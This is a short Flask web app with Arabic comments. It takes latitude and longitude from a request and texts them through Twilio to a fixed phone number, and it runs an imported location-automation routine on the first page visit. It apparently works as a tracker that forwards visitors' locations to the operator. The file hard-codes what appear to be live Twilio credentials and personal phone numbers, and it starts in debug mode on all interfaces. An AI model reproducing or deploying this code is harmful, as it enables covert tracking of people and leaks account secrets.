from flask import Flask, render_template, Response, request
from twilio.rest import Client
from automation import automate_location

app = Flask(__name__)

# Twilio credentials
TWILIO_PHONE_NUMBER = '+1 954 951 8621'  # رقم Twilio الذي حصلت عليه
TWILIO_ACCOUNT_SID = 'AC2c862687b1e6e32f4965c5127daeb626'  # حساب SID الخاص بـ Twilio
TWILIO_AUTH_TOKEN = '11f17b80eb701998e5ce95f909b63e2b'  # رمز التفويض الخاص بـ Twilio

# متغير لتتبع ما إذا تم تنفيذ الأتمتة أم لا
automation_executed = False

@app.route("/")
def index():
    global automation_executed

    # تنفيذ الأتمتة فقط إذا لم تكن قد تمت بالفعل
    if not automation_executed:
        automate_location()
        automation_executed = True
        return Response("تم تنفيذ الأتمتة بنجاح!")

    # عرض الصفحة الرئيسية بعد تنفيذ الأتمتة
    return render_template("index.html")


@app.route('/receive-location')
def receive_location():
    latitude = request.args.get('latitude')
    longitude = request.args.get('longitude')

    # إرسال رسالة باستخدام Twilio
    send_sms(latitude, longitude)

    return f"تم إرسال الموقع: Latitude: {latitude}, Longitude: {longitude}"


def send_sms(latitude, longitude):
    # إنشاء عميل Twilio
    client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

    # رسالة سيتم إرسالها
    message_body = f"تم العثور على الموقع الجغرافي: Latitude: {latitude}, Longitude: {longitude}"

    # إرسال الرسالة
    message = client.messages.create(
        body=message_body,
        from_=TWILIO_PHONE_NUMBER,
        to="+201005210580"  # ضع هنا رقم هاتفك لتلقي الرسالة
    )

    print(f"تم إرسال الرسالة بنجاح! SID: {message.sid}")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
